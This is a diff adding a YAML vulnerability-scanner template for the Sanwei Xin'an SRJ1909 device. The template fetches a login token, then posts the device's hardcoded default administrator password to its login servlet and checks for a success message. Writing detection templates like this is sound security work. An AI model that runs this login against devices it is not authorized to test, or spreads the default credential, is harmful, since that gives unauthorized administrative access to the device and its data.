@@ -1,0 +1,57 @@
+id: sansec-srj1909-default-password
+
+info:
+  name: Sanwei Xin'an SRJ1909 Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The Sanwei Xin'an SRJ1909 device has a default password vulnerability, allowing attackers to log in with administrative privileges and access sensitive data.
+  tags: default-password, authentication
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: get-token
+    method: GET
+    path:
+      - "/LoginServlet?method=getToken"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"status\":\"success\""
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "\"token\":\"(.*?)\""
+
+  - id: login
+    method: POST
+    path:
+      - "/LoginServlet?method=login"
+    headers:
+      token: "{{token}}"
+      Accept: "application/json, text/javascript, */*; q=0.01"
+      X-Requested-With: "XMLHttpRequest"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
+      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
+    body: "language=ZH&password=swxa%401234"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "登录成功"
+          - "\"status\":\"success\""
